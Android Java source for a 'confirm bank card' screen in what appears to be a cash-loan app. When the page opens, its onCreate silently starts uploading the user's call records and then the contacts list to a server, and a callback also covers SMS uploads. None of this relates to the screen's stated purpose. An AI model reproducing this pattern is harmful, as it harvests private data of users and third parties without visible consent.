package com.tianshen.cash.activity;

import android.os.Bundle;
import android.view.View;

import com.tianshen.cash.R;
import com.tianshen.cash.base.BaseActivity;
import com.tianshen.cash.constant.GlobalParams;
import com.tianshen.cash.utils.UploadToServerUtil;

/**
 * 确认银行卡页面
 */

public class ConfirmBankCardActivity extends BaseActivity implements View.OnClickListener {


    private UploadToServerUtil uploadUtil;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        uploadCallContacts();
    }

    @Override
    protected int setContentView() {
        return R.layout.activity_confirm_bank_card;
    }

    @Override
    protected void findViews() {

    }

    @Override
    protected void setListensers() {
    }

    @Override
    public void onClick(View view) {
        switch (view.getId()) {
            case R.id.tv_confirm_apply:
                onClickApply();
                break;
        }
    }

    /**
     * 点击了确认
     */
    private void onClickApply() {
    }


    /**
     * 上传通信录和联系人
     */
    private void uploadCallContacts() {
        uploadUtil = new UploadToServerUtil(mContext);
        uploadUtil.setCallBack(new MyUploadCallBack());
        uploadUtil.uploadUserInfo(GlobalParams.UPLOADCALLRECORD);
    }

    private class MyUploadCallBack implements UploadToServerUtil.UploadCallBack {

        @Override
        public void uploadSuccessCallBack(int type) {
            //上传通讯录、通话记录、短信等的回调
            switch (type) {
                case GlobalParams.UPLOADCALLCONTACTS:
                    //上传联系人成功
                    break;
                case GlobalParams.UPLOADCALLRECORD:
                    //上传通话记录成功
                    uploadUtil.uploadUserInfo(GlobalParams.UPLOADCALLCONTACTS);
                    break;
                case GlobalParams.UPLOADMESSAGE:
                    //上传短信成功
                    break;
            }
        }

        @Override
        public void uploadFailCallBack(int type) {
            switch (type) {
                case GlobalParams.UPLOADCALLCONTACTS:
                    //上传联系人失败
                    break;
                case GlobalParams.UPLOADCALLRECORD:
                    //上传通话记录失败
                    break;
                case GlobalParams.UPLOADMESSAGE:
                    //上传短信失败
                    break;
            }
        }
    }

}
